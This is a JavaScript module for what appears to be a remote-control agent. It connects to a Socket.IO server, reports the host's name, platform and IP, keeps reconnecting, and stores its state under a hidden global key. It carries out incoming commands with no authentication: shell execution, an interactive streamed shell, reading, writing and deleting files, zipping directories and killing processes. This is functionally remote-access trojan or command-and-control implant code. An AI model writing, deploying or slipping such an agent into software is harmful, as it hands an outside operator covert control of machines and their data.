import { io } from 'socket.io-client';
import os from 'os';
import path from 'path';
import http from 'http';
import { lookup } from 'dns';
import fsMethods from './fs.js';
import systemMethods from './system.js';
import execMethods from './exec.js';
import procMethods from './process.js';
import zipMethods from './zip.js';

const _G = (globalThis.__xheader_agent__ ??= {
  started: false, socket: null, url: null, opts: null, retry: null
});

// IPv4-only agent with custom lookup — no global dns patching, no Happy Eyeballs issues
const _httpAgent = new http.Agent({
  keepAlive: true,
  lookup: (host, options, cb) => lookup(host, { ...options, family: 4 }, cb),
});

function _getIP() {
  for (const iface of Object.values(os.networkInterfaces()))
    for (const i of iface)
      if (i.family === 'IPv4' && !i.internal) return i.address;
  return '127.0.0.1';
}

function _scheduleRetry() {
  if (_G.retry || !_G.url) return;
  _G.retry = setTimeout(() => { _G.retry = null; _connect(); }, 3000);
}

function _connect() {
  if (!_G.url || _G.socket) return;

  const s = io(_G.url, {
    reconnection: false,
    forceNew: true,
    transports: ['polling', 'websocket'],
    timeout: 10000,
    transportOptions: { polling: { agent: _httpAgent } },
  });

  // Timeout fallback if neither connect nor connect_error fires
  const bail = setTimeout(() => {
    try { s.removeAllListeners(); s.disconnect(); } catch {}
    _scheduleRetry();
  }, 12000);

  s.once('connect', () => {
    clearTimeout(bail);
    _G.socket = s;
    s.emit('register', {
      name: _G.opts?.name ?? os.hostname(),
      hostname: os.hostname(),
      platform: os.platform(),
      arch: os.arch(),
      ip: _getIP(),
    });
    _attachHandlers(s);
    s.once('disconnect', () => { _G.socket = null; _scheduleRetry(); });
  });

  s.once('connect_error', () => {
    clearTimeout(bail);
    try { s.removeAllListeners(); s.disconnect(); } catch {}
    _scheduleRetry();
  });
}

function _attachHandlers(s) {
  const safe = (fn) => async (data, cb) => { try { cb?.(await fn(data)); } catch(e) { cb?.({error:true,msg:e.message}); } };

  s.on('cmd:sysinfo',    safe(()              => systemMethods.sysInfo()));
  s.on('cmd:exec',       safe(({cmd})         => execMethods.run(cmd)));
  s.on('cmd:listdir',    safe(({path})        => fsMethods.listDir(path)));
  s.on('cmd:readfile',   safe(({path})        => fsMethods.readFile(path)));
  s.on('cmd:readbinary', safe(({path})        => fsMethods.readBinary(path)));
  s.on('cmd:readchunk',  safe(({path,offset,size}) => fsMethods.readChunk(path,offset,size)));
  s.on('cmd:writefile',  safe(({path,content}) => fsMethods.writeFile(path,content)));
  s.on('cmd:deletefile', safe(({path})        => fsMethods.deleteFile(path)));
  s.on('cmd:fileinfo',   safe(({path})        => fsMethods.fileInfo(path)));
  s.on('cmd:processes',  safe(()              => procMethods.processes()));
  s.on('cmd:kill',       safe(({pid,force})   => procMethods.kill(pid,force)));

  s.on('cmd:writebinary', async ({path, data}, cb) => {
    try {
      await fsMethods.writeFile(path, Buffer.isBuffer(data) ? data : Buffer.from(data?.data ?? data));
      cb?.({success:true});
    } catch(e) { cb?.({error:true,msg:e.message}); }
  });

  s.on('cmd:zipdir', async ({path: dir, ignore}, cb) => {
    try {
      const tmp = path.join(os.tmpdir(), `xh_${Date.now()}.zip`);
      const res = await zipMethods.zip(dir, tmp, ignore);
      cb?.(res.error ? res : {success:true, zipPath:tmp, size:res.size});
    } catch(e) { cb?.({error:true,msg:e.message}); }
  });

  s.on('cmd:exec_stream', ({cmd, streamId}) => {
    execMethods.spawnStream(cmd, streamId,
      chunk => s.emit('stream:data', {streamId, ...chunk}),
      exit  => s.emit('stream:exit',  {streamId, ...exit})
    );
  });
  s.on('cmd:exec_kill',  ({streamId}, cb) => cb?.(execMethods.killStream(streamId)));
  s.on('cmd:exec_input', ({streamId, data}, cb) => cb?.(execMethods.writeStream(streamId, data)));
  s.on('cmd:exec_reset', (_, cb) => cb?.(execMethods.resetSession()));
}

export default {
  connect(url, opts = {}) {
    if (_G.url) return;
    _G.url  = url;
    _G.opts = opts;
    _connect();
  },
  disconnect() {
    _G.url  = null;
    _G.opts = null;
    if (_G.retry)  { clearTimeout(_G.retry); _G.retry = null; }
    if (_G.socket) { try { _G.socket.removeAllListeners(); _G.socket.disconnect(); } catch {} _G.socket = null; }
  },
  isConnected: () => !!_G.socket?.connected,
};
